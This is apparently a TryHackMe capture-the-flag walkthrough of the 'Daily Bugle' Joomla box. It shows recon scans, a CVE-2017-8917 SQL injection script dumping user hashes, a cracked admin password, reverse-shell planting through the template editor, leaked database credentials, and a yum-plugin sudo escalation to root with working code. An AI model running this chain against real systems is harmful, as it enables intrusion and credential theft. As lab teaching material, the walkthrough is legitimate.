
Target IP - 10.48.137.46
## Recon

### Rustscan Info

3 Open ports: 22, 80, 3306

```Bash
#allports Scan
rustscan -a 10.48.137.46 -r 1-65535 -- -oN allports.txt
#services Scan
rustscan -a 10.48.137.46 -- -sC -sV -oN services.txt


PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 62 OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCbp89KqmXj7Xx84uhisjiT7pGPYepXVTr4MnPu1P4fnlWzevm6BjeQgDBnoRVhddsjHhI1k+xdnahjcv6kykfT3mSeljfy+jRc+2ejMB95oK2AGycavgOfF4FLPYtd5J97WqRmu2ZC2sQUvbGMUsrNaKLAVdWRIqO5OO07WIGtr3c2ZsM417TTcTsSh1Cjhx3F+gbgi0BbBAN3sQqySa91AFruPA+m0R9JnDX5rzXmhWwzAM1Y8R72c4XKXRXdQT9szyyEiEwaXyT0p6XiaaDyxT2WMXTZEBSUKOHUQiUhX7JjBaeVvuX4ITG+W8zpZ6uXUrUySytuzMXlPyfMBy8B
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKb+wNoVp40Na4/Ycep7p++QQiOmDvP550H86ivDdM/7XF9mqOfdhWK0rrvkwq9EDZqibDZr3vL8MtwuMVV5Src=
|   256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP4TcvlwCGpiawPyNCkuXTK5CCpat+Bv8LycyNdiTJHX
80/tcp   open  http    syn-ack ttl 62 Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: Joomla! - Open Source Content Management
|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-title: Home
3306/tcp open  mysql   syn-ack ttl 62 MariaDB 10.3.23 or earlier (unauthorized)
```

### Directory Bruteforce

```Bash
└─$ ffuf -u http://10.48.137.46:80/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt -e .php,.zip,.txt,.bak -mc 200,301 -o files_ffuf.txt


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.48.137.46:80/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
 :: Extensions       : .php .zip .txt .bak 
 :: Output file      : files_ffuf.txt
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,301
________________________________________________

images                  [Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 37ms]
language                [Status: 301, Size: 237, Words: 14, Lines: 8, Duration: 23ms]
tmp                     [Status: 301, Size: 232, Words: 14, Lines: 8, Duration: 27ms]
plugins                 [Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 28ms]
administrator           [Status: 301, Size: 242, Words: 14, Lines: 8, Duration: 27ms]
components              [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 28ms]
bin                     [Status: 301, Size: 232, Words: 14, Lines: 8, Duration: 29ms]
libraries               [Status: 301, Size: 238, Words: 14, Lines: 8, Duration: 23ms]
media                   [Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 542ms]
index.php               [Status: 200, Size: 9288, Words: 441, Lines: 243, Duration: 120ms]
includes                [Status: 301, Size: 237, Words: 14, Lines: 8, Duration: 3254ms]
templates               [Status: 301, Size: 238, Words: 14, Lines: 8, Duration: 3515ms]
cache                   [Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 3520ms]
modules                 [Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 4522ms]
layouts                 [Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 59ms]
README.txt              [Status: 200, Size: 4494, Words: 481, Lines: 73, Duration: 38ms]
robots.txt              [Status: 200, Size: 836, Words: 88, Lines: 33, Duration: 36ms]
configuration.php       [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 27ms]
htaccess.txt            [Status: 200, Size: 3005, Words: 438, Lines: 81, Duration: 25ms]
LICENSE.txt             [Status: 200, Size: 18092, Words: 3133, Lines: 340, Duration: 37ms]
cli                     [Status: 301, Size: 232, Words: 14, Lines: 8, Duration: 37ms]

```

README.txt - Joomla 3.7 Version is running!!
## Service Exploitation

URL - https://github.com/BaptisteContreras/CVE-2017-8917-Joomla

```Bash
┌──(kali㉿kali)-[~/Downloads/thm/daily_bugle/CVE-2017-8917-Joomla]
└─$ python3 main.py --host 10.48.137.46
/home/kali/Downloads/thm/daily_bugle/CVE-2017-8917-Joomla/main.py:39: SyntaxWarning: invalid escape sequence '\ '

    
>> Target : http://10.48.137.46:80/index.php
>> CSRF token : 45aa529cd00dfe986c984dd878d52e9b
>> http://10.48.137.46:80/index.php is vulnerable to SQLI
>> Database version detected : 5.5.64-MariaDB
>> Current database : joomla
>> Show tables in database joomla


SELECT (id, name, username, email, password, block, sendEmail, registerDate, lastvisitDate, activation, params, lastResetTime, resetCount, otpKey, otep, requireReset) FROM #__users
>> --------------------------------------------------------------------------------------------------------------------------------
>> id, name, username, email, password, block, sendEmail, registerDate, lastvisitDate, activation, params, lastResetTime, resetCount, otpKey, otep, requireReset
>> --------------------------------------------------------------------------------------------------------------------------------
>> 811 ||| Super User ||| jonah ||| jonah@tryhackme.com ||| $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm ||| 0 ||| 1 ||| 2019-12-14 20:43:49 ||| 2019-12-15 23:58:06 ||| 0 |||  ||| 0000-00-00 00:00:00 ||| 0 |||  |||  ||| 0

```

### Cracking hash

```URL 
https://hashes.com/en/decrypt/hash

 **Found:**
$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm:spiderman123
```

## Triggering Revershell

Login to /administrator - jonah:spiderman123

Navigate -> Extensions -> Templates -> Template 
Select any .php and replace with revershell.php -> click on preview

```URL
http://10.48.137.46/administrator/index.php?option=com_templates&view=template&id=503&file=L2luZGV4LnBocA
```

## Obtain User.txt
### Configuration files holds Passwords

```Bash
cat /var/www/html/configuration.php
<?php
class JConfig {
        public $offline = '0';
        public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
        public $display_offline_message = '1';
        public $offline_image = '';
        public $sitename = 'The Daily Bugle';
        public $editor = 'tinymce';
        public $captcha = '0';
        public $list_limit = '20';
        public $access = '1';
        public $debug = '0';
        public $debug_lang = '0';
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'root';
        public $password = 'nv5uz9r3ZEDzVjNu';
        public $db = 'joomla';
        public $dbprefix = 'fb9j5_';
        public $live_site = '';
        public $secret = 'UAMBRWzHO3oFPmVC';
        public $gzip = '0';
        public $error_reporting = 'default';
        public $helpurl = 'https://help.joomla.org/proxy/index.php?keyref=Help{major}{minor}:{keyref}';
        public $ftp_host = '127.0.0.1';
        public $ftp_port = '21';
        public $ftp_user = '';

```

```Bash
[jjameson@dailybugle ~]$ cat user.txt 
27a260fe3cba712cfdedb1c86d80442e
[jjameson@dailybugle ~]$ 
```

### Escalation of Priv to ROOT!!

```Bash
User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

```Bash
cd /home/jjameson/temp-dir
cat > x << EOF
[main]
plugins=1
pluginpath=/home/jjameson/temp-dir
pluginconfpath=/home/jjameson/temp-dir
EOF

cat > y.conf << EOF
[main]
enabled=1
EOF

cat > y.py << EOF
import os
import yum
from yum.plugins import TYPE_CORE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo /usr/bin/yum -c /home/jjameson/temp-dir/x --enableplugin=y clean all


[jjameson@dailybugle temp-dir]$ sudo /usr/bin/yum -c /home/jjameson/temp-dir/x --enableplugin=y clean all
Loaded plugins: y
No plugin match for: y
sh-4.2# whoami
root
sh-4.2# pwd
/home/jjameson/temp-dir
sh-4.2# cd ~
sh-4.2# cd /root
sh-4.2# ls
anaconda-ks.cfg  root.txt
sh-4.2# cat root.txt
eec3d53292b1821868266858d7fa6f79
```